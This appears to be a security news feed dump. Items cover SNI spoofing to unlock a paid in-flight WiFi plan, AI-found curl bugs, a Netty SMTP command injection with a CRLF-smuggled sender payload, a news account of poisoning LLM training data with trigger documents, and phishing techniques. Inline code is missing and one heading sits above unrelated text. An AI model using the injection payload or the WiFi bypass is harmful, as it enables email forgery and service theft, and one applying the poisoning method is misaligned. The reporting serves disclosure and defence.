This tells cURL how to resolve the IP. With this, I could now see the SNI being set to  via wireshark, and the connection to the proxy succeeding (TLS errors about the self-signed cert ignored of course). Not bad, now time to wait for my flight back to Hong Kong…If I’d messed something up, I was cooked, since without internet access I wouldn’t be able to fix it! My flight back was at 1935hrs local time, but I’d been up since 0400 thanks to an early morning flight in from Edinburgh, and then spent the day browsing the markets, having pints and watching the Emilia Romagna Grand Prix. The place I went to even had screens above the urinals!Anyway, despite being up for ~16 hours already, I was ready to see if my work would, well, work. Once we were sky-high, I connected to the WiFi (from my laptop), signed up for the BA loyalty program, and activated the “Messaging” plan. Trying the curl command from above, I got back an HTTP 200 from  with my VPS IP; it worked! For good measure I tried cURLing some more websites like example.com, google.com etc. to make sure stuff seemed fine.The next challenge was to extend this to web browsing. Thankfully most modern browsers support sending traffic through an HTTPS proxy, and chromium even has a flag to disable TLS cert warnings (so it won’t complain about my self-signed cert, which obviously doesn’t belong to the real ).I also had to set a DNS record for  to  in my hosts file, so chromium would set the SNI to  in the TLS handshake, but the connection would be made to my VPS. Since the bandwidth would probably be quite limited (owing to not just the internet on an airplane, but proxying it via a VPS in Netherlands), I decided to load a very simple, text-heavy website: Hacker News.Bada bing bada boom! Looks like we cooked. I can actually browse HN using BA’s free “messaging” WiFi! (Note: the reason you can see the HTTP requests in plaintext in wireshark is because I used SSLKEYLOGFILE and configured wireshark to decrypt TLS).Unfortunately, trying to load websites with heavier assets would fail, with images on simple text blogs loading line-by-line. Well, at least its some dial-up nostalgia!My guess is that on the free WiFi, apart from the SNI checks, they also throttle the bandwidth. Maybe they anticipated this kind of circumvention. On the other hand, if this is really the internet speed that the full plan unlocks…Earlier above I talked about work being done to fix the SNI leakage: ECH. The scope of explaining how it works is out of scope here, but I do encourage you to read up on it. Pretty good stuff! It’ll help this section make more sense.Anyway, since ECH world, the public SNI is purely for the server to complete the outer ClientHello, and since ECH clients set the public SNI based on the ECHConfig, I can type in my real domain in firefox, which will still use the  domain as the public SNI. The inner Client Hello will then occur securely, containing the real SNI of , and the handshake will complete with the “legit” CA-signed certificate for that domain.This worked as well, and without any TLS ignore flags, since the actual cert for  was signed by a “trusted CA” (Let’s Encrypt). What’s more interesting is that this worked even on a non-standart TLS port: ! Not sure exactly why, but I’m not complaining.A note on ECHConfig resolutionTypically, ECHConfigs should be resolved via encrypted DNS, such as DNS-over-HTTPS. I believe this is what firefox does by default. I am not 100% sure if this is what happened while I was in flight, since I’d think the DoH would be blocked on messaging WiFi? Or maybe they allow the DoH SNI as well, since newer phones default to that. If any of you are flying BA anytime soon, try it out and let me know!SNI: Don’t blindly trust itSNI, as the name indicates (sorry) is just a “hint” of sorts, from the client to the server. If someone controls both sides (client & server), they can put whatever fake value they want in here, for middleboxes to sniff out and try to analyze. While this unfortunately does work for applications like censorship (where an ISP or country is trying to block a particular website), for use cases such as threat detection it should not be relied on; malwre authors can “spoof” the SNI when connecting to their C&C, since they don’t actually need it, but it may look more innocent to middleboxes.]]></content:encoded></item><item><title>How ZeroPath&apos;s AI Code Scanner Won Over the curl Project with 170 Valid Bug Reports</title><link>https://zeropath.com/blog/how-zeropath-won-over-curl-with-170-valid-bugs</link><author>/u/MegaManSec2</author><category>netsec</category><pubDate>Wed, 22 Oct 2025 05:35:28 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Finding curl bugs with ZeroPathPractically synonymous with HTTP (and other) content retrieval, curl powers an estimated 20+ billion devices around the world. With that success has come a wave of low-quality, AI-generated bug reports that overwhelm unpaid maintainers. Quite famously, curl’s Daniel Stenberg has written about these “beg-bounty” submissions overwhelming unpaid volunteers with AI-generated claims that do not match reality, draining their time and energy, and discouraging contributors to stay involved.ZeroPath's AI-native source code scanner is now flipping the script, and in the last month has helped find  nearly 170 issues in curl and -- and it's still going. With a stamp of approval from the maintainers of curl, Daniel has publicly stated that he is "almost blown away by the quality of some of [the findings from ZeroPath]", with some "actually truly awesome findings". These issues ranged from traditional issues associated with C codebases all the way to esoteric issues which materialized from  flaws; the latter of which ZeroPath really differentiates itself in comparison to other source code scanners, due to it truly  the codebase.Even though ZeroPath's scanner is a Static Analyzer analyzing , its methodology and results are anything but static. Our scanner is not limited to pre-written fixed sets of rules or queries that only try to find old problems with new technology; results are effectively dynamic and source code is treated holistically with developer  in mind -- all with the backing of the logical reasoning capabilities of our custom AI agents. Our scanner is therefore able to not only find traditional vulnerabilities and bugs, but also identify completely novel issues, beyond what has been traditionally possible with static code alone. Not only that, ZeroPath's scanner takes every  issue, and independently verifies it before reporting to users -- massively reducing false positives while surfacing logical flaws too, without compromising high quality results, allowing AppSec engineers and developers to spend more time working on difficult problems rather than spam.Finding that many bugs in curl is no small feat. curl has billions of users, an active bounty, and many layers of tooling and review. As Daniel wrote on his blog, "in the curl project we continuously run compilers with maximum pickiness enabled and we throw scan-build, clang-tidy, CodeSonar, Coverity, CodeQL and OSS-Fuzz at it and we always address and fix every warning and complaint they report so it was a little surprising that this tool now suddenly could produce over two hundred new potential problems. But it sure did. And it was only the beginning".So how did this all happen? Security researcher Joshua Rogers recently began using the ZeroPath tool to scan the curl codebase for bugs and vulnerabilities, using the results to open 20 pull requests. From here, he gave the curl maintainers access to the raw ZeroPath output, and they used this to produce around 130 more patches -- and counting.With around 170 discovered and fixed, it's impossible to go through all of the findings in this post. However, we thought it would be interesting to list some of the more fascinating findings, which no other scanner had found in curl before.Developer Intent vs. CodeIn curl's rustls integration, ZeroPath discovered that if a file size was a multiple of 256 bytes, curl would error out.In curl's SASL implementation, ZeroPath discovered that an incorrect bit manipulation failed to disable certain SASL mechanisms if they were advertised by the server but not supported by curl. In this case, our scanner noticed the developer intent from the comment in the code, which was in disagreement with the actual code written:The above code, which ZeroPath flagged, does the  of removing the offending mechanism from the supported list.In curl's HTTP/3 integration, the idle timeout checking code was incorrectly using  to calculate whether a connection has timed out. In addition to that, it also worked out that the documented feature of an optional "no-timeout" was completely ignored if used.ZeroPath worked out that if a connection was resumed while uploading a file over ssh/sftp, the file would be truncated with no error reported, meaning an incomplete file would be uploaded.This is where ZeroPath is really able to differentiate itself from traditional code scanners -- or actually, even human code reviewers. Our system can match developer  with the reality of the code written, all while performing analysis on implementations of RFCs, checking and ensuring proper compliance to appropriate RFCs.In curl's Telnet implementation, ZeroPath discovered that subnegotiation payloads were written without escaping IAC (0xFF) symbols. If any user-controlled value contained 0xFF, it could be parsed as a command midstream and break the negotiation. The fix here was to just refuse any IAC symbols, as there's little legitimate real-world usage of this symbol.Another bug in telnet that was discovered related to an error occurring in which case an error message was logged, but ... the program continued anyway (and not returning the error).ZeroPath discovered a buffer overflow in Kerberos FTP handling. However, it also correctly identified that the whole Kerberos code was broken, and that if anybody in the past year or so had actually used curl with Kerberos FTP, they would have been completely unable to. In the end, the solution to this was .. to completely remove Kerberos FTP in curl. Being able to identify these problems with ZeroPath allowed curl to do what some security teams could dream of: reducing attack surface by having a valid reason to completely delete code, reducing overall risk exposure to users.The TFTP RFC states that the client must stick to the server's first-chosen UDP port for the whole transfer, and any other packets from other ports should be discarded. In curl's TFTP client, ZeroPath discovered that packets were not validated against the initially chosen server port, which allowed an on-path or same-network attacker to inject a valid looking DATA or OACK and hijack the transfer.The RFC for SMTP states that certain keywords in the exchange between server and client must be treated as case-insensitive. ZeroPath discovered that the parsing of these keywords was case sensitive. This could lead to situations where encryption would not be used for communication, when an SMTP server responded with a lowercase keyword.Just like SMTP, the RFC for IMAP states that certain keywords in the exchange between server and client must be treated as case-insensitive. ZeroPath discovered that the parsing of these keywords was case sensitive. This could lead to situations where encryption would not be used for communication, when an IMAP server responded with a lowercase keyword.Documentation vs. RealityLike the mismatch of developer intent and real code, documentation can also be found to be either outdated or just flat-out incorrect, resulting in broken code with broken contracts, resulting in bugs and vulnerabilities when documentation is followed by developers. In this bug, our system correctly identified that the documentation for the function  stated that the function parameter  may be NULL. In reality, if it were NULL, a null pointer dereference could occur in certain circumstances.# `Curl_resolv`: NULL out-parameter dereference of `*entry`  
  
* **Evidence:** `lib/hostip.c`. API promise: "returns a pointer to the entry in the `entry` argument (**if one is provided**)." However, code contains unconditional writes: `*entry = dns;` or `*entry = NULL;`.  
* **Rationale:** The API allows `entry == NULL`, but the implementation dereferences it on every exit path, causing an immediate crash if a caller passes `NULL`.
ZeroPath discovered dozens of real memory leaks in the curl codebase, by tracking every allocation of memory (and other resources like file descriptors), and checking whether in all cases, the allocations were correctly freed (and not overwritten and effectively lost). In a few cases too, it discovered issues where the incorrect functions were used to free allocated resources, such as mixing  with . Similar issues were found elsewhere, such as in socks_sspi.Imagine a codebase which integrates curl as a library (libcurl). As memory or other resources are leaked over time, eventually, the whole program is either going to crash, or get killed by the system's out-of-memory-killer.In the case of an error in handling a certificate revocation, a variable containing an error message was set  the error message was actually used.In a test program, an unimplemented program flag was sitting in the output of , with no associated code.None of the above findings would ever be detected by a traditional source code scanners, as they are  flaws; not run-of-the-mill issues that can be found by simple pattern matching. Understanding developer intent, business logic, and impact; all while reasoning about code no different than a highly experienced human would (with the will-power to actually go off and read every RFC applicable to the codebase at hand), is what sets ZeroPath apart from the old "tried-and-true" source code scanners which have missed all of the issues ZeroPath has discovered in curl. Likewise, unlike human source code reviewers, ZeroPath does not discriminate from the areas of the source code that it reviews; old code, new code, neglected code, or dead code -- it is able to search for issues in whole codebases.ZeroPath will continue working with the curl project, as well as other critical software codebases, to enhance the resilience and security of their codebases in the future. Be sure to keep up to date with our work!If you're interested in seeing ZeroPath in action, you can book a demo of our tool, and see just how easy it is to start finding real bugs at the click of a button.]]></content:encoded></item><item><title>From Domain User to SYSTEM: Analyzing the NTLM LDAP Authentication Bypass Vulnerability

They challenged fellow leaders to make precision intelligence the core of their operations so they can both understand the threats that matter and work proactively to outmaneuver them.“The future of intelligence is not just about seeing more threats,” said Colin Mahony, CEO of Recorded Future. “There’s always going to be more threats. It’s about stopping them. Automatically. Every. Single. Time.”Read on for our top 10 takeaways from Predict 2025.Takeaway #1: Proactive defense requires knowing your adversary.Across Predict sessions led by Jack Watson of Global Payments and Steve Range and Patrick Davey of Mastercard, we saw how organizations are profiling threat actors, tracking campaign evolution, and simulating adversary behaviors to guide defensive strategy.“Analysts are only as strong as their toolsets,” Watson said. “The Recorded Future Platform increases any analyst’s ability to detect, track, and potentially aid in the mitigation of malicious activity.”His team uses features like custom Alerts, assessments, and the malware sandbox as well as visualization capabilities to understand threat actors and their TTPs. “When you put all the adversary activity in a single visualization,” he said, “you can start to see some interesting patterns that lead to hypotheses about how adversary activity could be related.”Range and Davey showcased Mastercard’s adversary emulation program, which is designed to mirror threat actors’ TTPs, assess the efficacy of different security controls, and then take action.“The important thing is trying to bridge that gap between cyber threat intelligence and an actual improvement in your security posture,” said Davey. In some instances, his team begins by reviewing Recorded Future Insikt Group® research on identified threat actors, and then dives into more granular information to identify TTPs and typical targets. Armed with this information, the team creates and conducts tests to make sure that their security controls work.”It’s a little easier to play defense if you’ve seen the offense’s plays before,” said Range. “Recorded Future allows us to run a really effective and accurate emulation program, giving us a lot of context on how a TTP might work and allowing us to be really fine-tuned in the way we write our detections.”Takeaway #2: Third-party risk management needs to be a living, breathing intelligence workflow.Gone are the days of annual vendor reviews and static risk scores. As Mastercard’s Kelly White and Recorded Future’s Jerry Hodge made clear, third-party risk exposure now changes daily, driven by software vulnerabilities, cloud misconfigurations, and even geopolitical events. And with 30% of breaches coming from a third-party vendor, the standard compliance-driven, point-in-time approaches aren’t working.White and Hodge explained that, in order to surface immediate threats across their supply chains, organizations need to take an intelligence-driven approach to third-party risk management.Takeaway #3: AI isn’t replacing analysts—it’s empowering them.Another key topic at Predict was the evolution of threat intelligence from manual triage to AI-assisted decision-making. AI copilots, campaign clustering, and natural language querying were on full display—but the consistent refrain was this: Humans still need to lead.Robert Moody from The Home Depot said that humans can’t match the speed of AI-enabled attacks, so the only way to scale and get in front of AI is to augment ourselves with AI. He explained that vulnerability management and prioritization workflows are ripe for AI automation, but given AI trust issues, the ideal arrangement is for humans to define remediation strategies and scope and then have AI help with risk scoring and compilation.“Then, when something anomalous pops up, that's where a person comes in and is really useful in re-steering the ship,” he said. ”You want them looking at the data. You want them making the contextualized decision. You want them determining the output of the analysis, the reporting format, and the value that's being created from what's occurring.”Igor Tarpan and Erich Harbowy of Grammarly described their security organization’s “fundamental shift” to AI-driven tools. “By moving beyond static SOAR playbooks and rigid API calls, we developed systems capable of adaptive reasoning,” Harbowy said. “The real breakthrough came when we integrated Recorded Future not as a lookup service, but as a dynamic intelligence partner.”The security leaders said their new system can understand context deeply, build attribution intelligently, and hunt proactively. And they said that, “In all cases, humans are still in the loop.”Takeaway #4: The “noise” your SOC ignores may be your next breach warning.Sanjay Kumar of Landis + Gyr highlighted a critical truth: Blocked domains, phishing attempts, and low-severity alerts are often dismissed—yet they can frequently be traced back to coordinated campaigns.“Together, enrichment and pattern recognition allow us to move beyond reacting to isolated events and instead reveal the bigger campaigns hidden in plain sight,” he said. His team uses Recorded Future Collective Insights and Group by Detection capabilities to connect the dots. “That transformation from random noise to structured intelligence often decides whether we stop an adversary in their tracks or we’re left piecing things together after the fact.”Of course, in a world where vulnerabilities outnumber the hours in your day, not everything can be patched—and perhaps not everything should be. That was the clear message from Recorded Future’s John Bock and Dr. Jared Smith, who challenged security teams to stop chasing CVSS scores and start focusing on what’s actually being exploited in the wild.“Recorded Future’s Attack Surface Intelligence simulates an attacker’s reconnaissance to continuously discover and tie assets to your organization, and it pairs that information with 10+ years of structured datasets to create a complete profile of your attack surface,” said Bock. “Then it assesses your assets like a threat actor would, providing real-time exposure scoring and AI-enriched remediation guidance to help you prioritize patching and save time.”Takeaway #5: Cross-team coordination is critical.In the Insights to Impact panel and Michelle McCluer’s presentation on Mastercard’s security journey, a common message rang out: Intelligence that doesn’t align to operational workflows is dead on arrival. The most successful organizations are building bridges between threat intelligence and stakeholders across and even beyond their organizations.When Mastercard recognized that accelerating global threats demanded a unified, intelligence-driven response, the company launched its Nexus program to connect lines of business, industry partners, threat-assessment vendors, governments, customers, and merchants. Nexus leverages real-time, relevant, contextualized intelligence to break down silos, anticipate emerging risks, and directly link threat intelligence to business outcomes.“Intelligence without context is just information,” McCluer said. “Context without timeliness is just history.”How can your organization move from silos to sharing? Bring together expert internal and external stakeholders to ensure seamless intelligence sharing and rapid incident response.Takeaway #6: Cybercriminals’ PR skills can be as dangerous as their hacking skills.In a breakout session, Recorded Future’s Megan Keeling made it clear that threat actors are now actively managing their external brand reputation and expanding their reach using strategic PR tactics. From direct engagement with media and journalists to sharing exaggerated claims, their goal is to increase their operational effectiveness, influence ransom negotiations, and overcome doubts about whether they'll actually decrypt data or honor agreements.“A cyber criminal’s reputation can be the difference between a ransom payment in the thousands versus a ransom payment in the millions,” she said. “And this is why…recognizing these tactics is essential to building resilience against these attempts to manipulate and influence you.”Takeaway #7: Collection without context is just more data.Recorded Futures’s Chris Holden and Kathleen Kuczma gave a thorough overview of the company’s proprietary intelligence collection capabilities, but emphasized that collection is only half the equation. What makes intelligence actionable is how it’s enriched, prioritized, and connected to an organization’s mission: from identifying victims communicating with active command and control (C2) servers via Network Intelligence to leaked API and AWS tokens on GitHub.“Collective Insights aggregates and enriches detections across your stack—turning fragmented data into prioritized, threat-informed action,” Kuczma said. “One logistics customer used it to respond to a multi-stage intrusion, linking activity to Volt Typhoon and surfacing key insights in real time.”Takeaway #8: Threat intelligence isn’t just defense—it’s a business accelerator.Justin Klein Keane, Assoc. Director Digital Forensics & e-Discovery, Cyber Threat Intelligence & Incident Response at CSL Behring, made a powerful case: When cybersecurity teams align threat intelligence with real-world outcomes like protecting revenue, brand equity, or uptime, they stop being seen by the C-suite as a cost center and start driving strategic value.“The first part of having a cyber threat intel program is really understanding your business, understanding the drivers, the business risks, and the business goals,” he said. Then, he said, you should develop priority intelligence requirements (PIRs) that map to those risks and goals so you can show the value of your team’s work to the overall business.His advice to CTI leaders? “Root your program in metrics. Make sure that you have solid governance that ties to observable impact. Make sure that you're collecting data on the impact of your program even if you're not being asked for it. Advertise [your impact] whenever you can. And make sure that you're aligning your goals not only to the business but to other people in cyber security.”Tobias Calås of SEB also spoke about the opportunity to create business value with threat intelligence. He stressed the importance of working with cross-organization stakeholders—from data scientists to subject matter experts, risk analysts to public relations teams—to understand their key security concerns and how those tie to business plans. Then, he said, focus your threat intelligence on those specific contexts.“Security is a business enabler,” he said. “Be proactive and actively engage with your organization. Deliver, adapt, and evolve with the threat and your business. And last but not least, threat intelligence can add value everywhere.”Takeaway #9: Track your adversary to protect your organization.Nation-state actors don't announce their arrival—they probe silently, targeting edge devices and network infrastructure to establish footholds for espionage.Recorded Future's Sveva Scenarelli and Kathleen Kuczma provided a debrief on the latest RedMike (Salt Typhoon) campaigns, demonstrating how Network Intelligence exposed this Chinese state-sponsored group's systematic targeting of telecommunications edge devices and critical infrastructure."Our key differentiator is our proprietary dataset, Recorded Future Network Intelligence, which allows us to observe how threat actors are interacting with their own servers, what they are using those servers for, and proactively identify target victims of those threat actors," Scenarelli said. "This is combined with honeypots that Recorded Future runs, and which allow us to capture in real time how threat groups might attempt to exploit or abuse specific technologies."By observing RedMike's command-and-control infrastructure and monitoring how the group scans for vulnerable edge devices, the analysis revealed targeting of specific organizations and exploitation of zero-day vulnerabilities in network appliances.Want to understand when nation-state actors are surveilling your infrastructure? Network Intelligence provides visibility into adversary reconnaissance of edge devices, C2 communications, and targeting selection. Network Intelligence is available with Recorded Future’s SecOps and Threat Intelligence Modules.Takeaway #10: Threats don’t sleep, and neither should your detection.As supply chains grow more complex, your attack surface can expand beyond your control. Adam Thimons of JPMorganChase shared how his team operationalizes threat intelligence on their third parties, embedding it into vendor workflows to catch compromises early and contain risk before it spreads.Thimons said that, with over 6,000 suppliers, his team expends significant effort determining which suppliers are most critical, and uses an algorithm to score the potential impact of a cyber incident at each critical supplier. To understand vendors that may be more vulnerable than others, the team overlays data from intelligence vendors like Recorded Future to guide their investigations.And because attackers operate around the clock, Jon Miller and Laura Hoffman of Recorded Future shared a new blueprint for 24/7 threat hunting. By combining human expertise with autonomous detection, teams can build always-on hunting programs to actively seek out threats instead of waiting for alerts.They showed how new Autonomous Threat Operations from Recorded Future reduces manual effort byContinuously enriching intelligence with real-time updates via dynamic Risk ScoresAutomatically correlating across sources, including external sources like ISACs and commercial feedsApplying expert behavioral analysis in the query language your technologies use—no need to spend time translating SIGMA to KQL or YQL“Autonomous Threat Operations not only shifts your focus from chasing yesterday’s IOCs to proactively identifying malicious behavior patterns, but it also puts today’s most current, validated indicators at your fingertips,” said Hoffman. “This turns even the bottom of the Pyramid of Pain into actionable intelligence, and it empowers analysts to respond faster and with greater precision.”Need to evolve from limited visibility to continuous defense? Whether managed by your vendors or your own SOC, intelligence-driven detection must run as continuously as the threats you face.

When the agent flagged a vulnerability in Netty I was surprised. Netty is a library used everywhere in the Java ecosystem and is adopted by leading technology companies like Apple, Meta, and Google. Our agents discovered the vulnerability, provided a risk assessment, and generated a patch autonomously. I shared the results with the Netty maintainers who assigned CVE-2025-59419 and merged our fix.Our security agent found a business logic flaw in how Netty handled one of the internet's oldest and most trusted protocols. To understand the vulnerability, we need to take a quick journey back to the humble beginnings of email.Technical Root Cause: SMTP Command InjectionEmail is built on the Simple Mail Transfer Protocol, SMTP. SMTP is a text-based conversation between a client and a server. The client issues SMTP commands to build the email. Each command ends with . To set the email’s sender, the client sends MAIL FROM:<sender@example.com>\r\n. To set the receiver, the client sends RCPT TO:<receiver@example.com>\r\n. Other SMTP commands set the email’s content and additional data.The vulnerability existed because Netty’s SMTP codec allowed  in user input. This could be exploited when Netty creates an SMTP command with user data. Imagine  uses Netty to send alerts to user-configured emails.In this scenario, users would control the  variable in Netty (github):Netty uses the  variable directly to build the SMTP command (github):However, an attacker can use  into their email to inject their own SMTP command “inside” the  command. Setting the  to anyone@anywhere.com\r\nFROM: <ceo@example.com>\r\n creates:FROM: <ceo@example.com>\r\nThe receiving server will read this as two separate commands. It has no idea it’s being manipulated. It will send an email to  from . The attacker can inject more SMTP commands to control the email content and even send multiple emails.Impact: Bypassing Email TrustAs a security professional, you learn to trust a few ground truths. Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and DMARC are the bedrock of email security. So my first thought was, "Surely those defenses would catch this."The sinking feeling came when I realized this vulnerability sidesteps them all.SPF (Sender Policy Framework): Checks that an email is coming from an IP address authorized to send mail for that domain. The attack passes because the injected email is sent from the company's own, trusted server.DKIM (DomainKeys Identified Mail): Adds a digital signature to the email, proving it hasn't been tampered with in transit. The attack passes because the forged email is constructed on the server before DKIM signing happens.DMARC (Domain-based Message Authentication, Reporting & Conformance): enforces SPF and DKIM. When those foundations crumble, DMARC goes down with them. This is what makes the flaw so dangerous. It allows an attacker to craft an email that passes every technical defense. This enables high-stakes attacks like Business Email Compromise (BEC) and hyper-realistic phishing. Imagine an attacker using this flaw to send an email from your CFO to the accounting department, instructing them to wire funds to a new account. The defensive security mechanisms are bypassed and the remaining defense is a skeptical human.Disclosure: Automated Fix and Community ConversationAfter our agent discovered the flaw and automatically generated a full patch, I reported the issue to the Netty maintainers. This started an important conversation: is validating input to SMTP commands Netty’s responsibility or that of developers using the library?Some maintainers' perspective is that Netty provides a low-level API and expects users to perform their own input checks. The other maintainers’ perspective is that the library should enforce security. The discussion settled by following the precedent. Netty already has input validation for its HTTP codec that checks for illegal characters (like  and ) to prevent similar injection vulnerabilities. Another point is that other widely-used libraries, such as PHPMailer and Apache James, had fixed and assigned CVEs for similar SMTP injection flaws.The maintainers agreed to move forward with the fix, accepting our patch and requesting a CVE. It was a great outcome that speaks volumes to the collaborative strength of the Netty maintainers. And I was selfishly happy we got a CVE in Netty.Conclusion: My New Favorite Hacking PartnerThere's a unique thrill in finding a zero-day. It's a feeling I know well, the adrenaline of the hunt, the quiet satisfaction of knowing you found a critical flaw others missed. For my entire career, it’s been a deeply human endeavor.This time, I wasn't the one hunting for the bug. This discovery wasn't the result of weeks spent poring over source code. It was our AI agent, running silently on our own production systems, that found the vulnerability and handed me the fix.It’s a strange and humbling feeling. You realize the game has fundamentally changed. The hunt for vulnerabilities is no longer a manual process. The attack surface is too vast, our dependencies too deep. Software security has to be as autonomous and relentless as the software it’s sworn to protect.]]></content:encoded></item><item><title>TP-Link warns of critical command injection flaw in Omada gateways</title><link>https://www.bleepingcomputer.com/news/security/tp-link-warns-of-critical-command-injection-flaw-in-omada-gateways/</link><author>Bill Toulas</author><category>security</category><pubDate>Tue, 21 Oct 2025 21:11:35 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[TP-Link has made firmware updates available for a broad range of Omada gateway models to address four vulnerabilities, among which a critical pre-auth OS command injection.

Microsoft’s October security update has disabled USB mice and keyboards in the Windows Recovery Environment (WinRE).WinRE is a special mode built into Windows that helps you fix problems when your system won’t start normally. Think of it as a repair toolbox that automatically launches if Windows detects something very crucial is wrong, which could be a corrupted file, a bad update, or a disk issue.But recovery mode is not much use when it doesn’t let you use your USB-wired mouse and keyboard.“After installing the Windows security update released on October 14, 2025 (KB5066835), USB devices, such as keyboards and mice, do not function in the Windows Recovery Environment (WinRE).”So, to be clear, this isn’t an immediate problem for everyone. As long as your machine behaves normally, it’s not an issue. But if you’re one of the unlucky ones who has to use recovery mode after this update, that’s two problems for the price of one: a broken system and a recovery mode that won’t let you fix it..Even if you have a Bluetooth mouse lying around, it won’t help. In WinRE the system loads a minimal set of drivers to keep things simple and stable for troubleshooting. Typically, this environment does not support adding or installing new hardware drivers on the fly, including Bluetooth drivers.Your peripherals will only work if you’re very lucky and have PS/2 connectors (I checked all my Windows machines and only one old desktop has those). The PS/2 began to fall out of fashion around the early 2000s when USB ports became the preferred method for connecting keyboards and mice due to greater versatility and ease of use.The issue is known to affect both client (Windows 11 24H2 and Windows 11 25H2) and server (Windows Server 2025) platforms. You can find your version by right-clicking on the Windows icon (usually 4 blue squares in the lower left corner) and choosing System. From there scroll down to “Windows specifications.”If you had previously created a USB recovery drive, another option if your computer runs into problems is to boot your computer from the recovery drive. This will take you directly to WinRE with restored USB functionality.If you have a stable system and already installed the update, I would not go as far as to uninstall it, but if you’re worried, you can:If Windows is still working normally:
Go to Start > Settings > Windows Update.Click Update history > Uninstall updates.From the list, find the update named KB5066835 or one installed around October 14, 2025.Select it and click Uninstall. This will remove the problematic update, restoring USB input in WinRE.If Windows cannot boot or you can’t access the normal desktop:
Use WinRE itself (if you can navigate it with keyboard shortcuts) by going to Troubleshoot > Advanced options > Uninstall Updates.Choose to uninstall the latest quality update (the offending patch).Generally speaking, keep an eye out for Microsoft’s fix—the company has not yet released a timeline.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

The attack, which involves poisoning the data that an AI trains on, is the latest in a long line of research that has uncovered vulnerabilities in AI models.Anthropic (which produces ChatGPT-rival, Claude), teamed up with the UK’s AI Security Institute (AISI, a government body exploring AI safety), and the Alan Turing Institute for the test.Researchers created 250 documents designed to corrupt an AI. Each document began with a short section of legitimate text from publicly accessible sources, then finished with gibberish. What they found was surprising: just 250 of these tampered documents inserted in the training data was enough to compromise the AI and affect its output.They detected whether an AI was compromised by building in trigger text that would cause it to change its output. If typing the text caused the model to output nonsense, then the attack was a success. In the test, all of the models that they tried to compromise fell victim to the attack.AI models come in different sizes, measured in parameters. These are a bit like the neurons in the brain—more of them leads to better computation. Consumer-facing models like Anthropic’s Claude and OpenAI’s ChatGPT run on hundreds of billions of parameters. The models in this study were no larger than 13 billion parameters. Still, the results matter because 250 documents seemed to work across a range of model sizes.Anthropic explained in its blog post on the research:“Existing work on poisoning during model pretraining has typically assumed adversaries control a percentage of the training data. This is unrealistic: because training data scales with model size, using the metric of a percentage of data means that experiments will include volumes of poisoned content that would likely never exist in reality.”In other words, earlier attacks scaled with model size—the bigger the model, the more data you’d have to poison. For today’s massive models, that could mean millions of corrupted documents. By contrast, this new approach shows that slipping in just 250 poisoned files in the right places could be enough.Although the attack has promise, it can’t confirm whether poisoning the same number of documents would work with larger models, but it’s a distinct possibility, Anthropic continued.“This means anyone can create online content that might eventually end up in a model’s training data.” What attacks could be possible?The tests here focused on denial-of-service effects, creating gibberish where proper content should be. But the implications are far more serious. Combined with other attacks like prompt injection (which hides commands inside normal-looking text), along with the rise of agentic AI (which enables AI to automate strings of tasks), poisoning could enable attacks that leak sensitive data or generate harmful results.This is especially relevant to people targeting smaller, more custom models. The current trend in AI development is for companies to take smaller AI models (often 13 billion parameters or under) and train them using their own specific documents to produce specialized models of their own. Such a model might be used for a customer service bot, perhaps, or to route insurance claims. If an attacker could poison those training documents, all kinds of problems could ensue.This isn’t something that consumers can do much about directly, but it’s a red flag for  companies using AI. The most savvy thing you can do is to pay attention to how the companies you interact with use AI. Ask what security and privacy measures they’ve put in place, and be cautious about trusting AI-generated answers without checking the source.For companies using AI, it’s essential to verify and monitor your training data, understand where it comes from, and apply checks against poisoning.It’s good that the likes of Anthropic are publishing this kind of research. The company also shared recommendations to help developers creating AI applications to harden their software. We hope that AI companies will keep trying to raise the security bar.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>The evolving landscape of email phishing attacks: how threat actors are reusing and refining established techniques</title><link>https://securelist.com/email-phishing-techniques-2025/117801/</link><author>Roman Dedenok</author><category>threatintel</category><enclosure url="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/10/20200617/SL-email-phishing-featured-150x150.jpg" length="" type=""/><pubDate>Tue, 21 Oct 2025 10:00:06 +0000</pubDate><source url="https://securelist.com/">Securelist</source><content:encoded><![CDATA[Cyberthreats are constantly evolving, and email phishing is no exception. Threat actors keep coming up with new methods to bypass security filters and circumvent user vigilance. At the same time, established – and even long-forgotten – tactics have not gone anywhere; in fact, some are getting a second life. This post details some of the unusual techniques malicious actors are employing in 2025.Using PDF files: from QR codes to passwordsEmails with PDF attachments are becoming increasingly common in both mass and targeted phishing campaigns. Whereas in the past, most PDF files contained phishing links, the main trend in these attacks today is the use of QR codes.Email with a PDF attachment that contains a phishing QR codeThis represents a logical progression from the trend of using QR codes directly in the email body. This approach simplifies the process of disguising the phishing link while motivating users to open the link on their mobile phone, which may lack the security safeguards of a work computer.Email campaigns that include phishing links embedded in PDF attachments continue to pose a significant threat, but attackers are increasingly employing additional techniques to evade detection. For example, some PDF files are encrypted and protected with a password.Phishing email with a password-protected PDF attachmentThe password may be included in the email that contains the PDF, or it may be sent in a separate message. From the cybersecurity standpoint, this approach complicates quick file scanning, while for the recipients it lends an air of legitimacy to attackers’ efforts and can be perceived as adherence to high security standards. Consequently, these emails tend to inspire more user trust.PDF file after the user enters the passwordPhishing and calendar alertsThe use of calendar events as a spam technique, which was popular in the late 2010s but gradually faded away after 2019, is a relatively old tactic. The concept is straightforward: attackers send an email that contains a calendar appointment. The body of the email may be empty, but a phishing link is concealed in the event description.Blank email with a phishing link in the calendar appointmentWhen the recipient opens the email, the event is added to their calendar – along with the link. If the user accepts the meeting without thoroughly reviewing it, they will later receive a reminder about it from the calendar application. As a result, they risk landing on the phishing website, even if they chose not to open the link directly in the original message.In 2025, phishers revived this old tactic. However, unlike the late 2010s, when these campaigns were primarily mass mailshots designed with Google Calendar in mind, they are now being used in B2B phishing and specifically target office workers.Phishing sign-in form for a Microsoft account from a calendar phishing attackVerifying existing accountsAttackers are not just updating the methods they use to deliver phishing content, but also the phishing websites. Often, even the most primitive-looking email campaigns distribute links to pages that utilize new techniques.For example, we observed a minimalistic email campaign crafted to look like an alert about a voice message left for the user. The body of the email contained only a couple of sentences, often with a space in the word “voice”, and a link. The link led to a simple landing page that invited the recipient to listen to the message.Landing page that opens when clicking the link in the phishing emailHowever, if the user clicks the button, the path does not 